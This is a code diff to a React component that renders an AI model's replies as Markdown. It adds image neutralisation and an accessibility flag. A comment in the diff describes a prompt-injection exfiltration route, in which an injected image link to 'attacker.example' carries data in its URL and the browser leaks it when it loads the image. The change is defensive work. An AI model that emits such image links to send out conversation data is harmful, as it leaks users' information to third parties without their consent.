@@ -14,26 +14,46 @@ import { createCodePlugin } from "@streamdown/code";
  * Shiki highlighting for fenced code. `[light, dark]` emits both themes as
  * inline `--shiki-light`/`--shiki-dark` CSS variables and Streamdown's
  * `dark:` Tailwind utilities pick between them off the `.dark` class on
- * `<html>` — no JS theme detection, no flash.
+ * `<html>`, with no JS theme detection and no flash.
  */
 const codePlugin = createCodePlugin({
   themes: ["github-light", "github-dark"],
 });
 
+/**
+ * An image in a reply renders as its alt text and is never fetched. The reply
+ * is model output, and a prompt injection or a tool result can steer it: an
+ * `![x](https://attacker.example/?d=…)` would otherwise have the browser send
+ * whatever the model put in that URL to a third party, with no confirmation.
+ * Streamdown's link-safety prompt covers links, not images.
+ */
+function InertImage({ alt }: { alt?: string }) {
+  return alt ? <span>{alt}</span> : null;
+}
+
+const COMPONENTS = { img: InertImage };
+
 export interface AssistantMarkdownProps {
   children: string;
   /** True while the text is still being revealed (see `assistant-streaming-text.tsx`). */
   streaming?: boolean;
+  /**
+   * False for the screen-reader copy a reveal announces: it is visually
+   * hidden, so a copy button in it would be a tab stop nobody can see.
+   */
+  interactive?: boolean;
 }
 
 export function AssistantMarkdown({
   children,
   streaming = false,
+  interactive = true,
 }: AssistantMarkdownProps) {
   return (
     <Streamdown
       parseIncompleteMarkdown={streaming}
       shikiTheme={["github-light", "github-dark"]}
+      components={COMPONENTS}
       plugins={
         // @streamdown/code resolves shiki@3.x while streamdown's own type
         // expects shiki@1.29.2, so `getSupportedLanguages()` returns two
@@ -48,7 +68,7 @@ export function AssistantMarkdown({
           typeof Streamdown
         >["plugins"]
       }
-      controls={{ code: { copy: true, download: false } }}
+      controls={interactive ? { code: { copy: true, download: false } } : false}
       className="max-w-none text-sm leading-relaxed [&>*:first-child]:mt-0 [&>*:last-child]:mb-0 [&_pre]:max-w-full [&_pre]:overflow-x-auto [&_table]:block [&_table]:max-w-full [&_table]:overflow-x-auto"
     >
       {children}
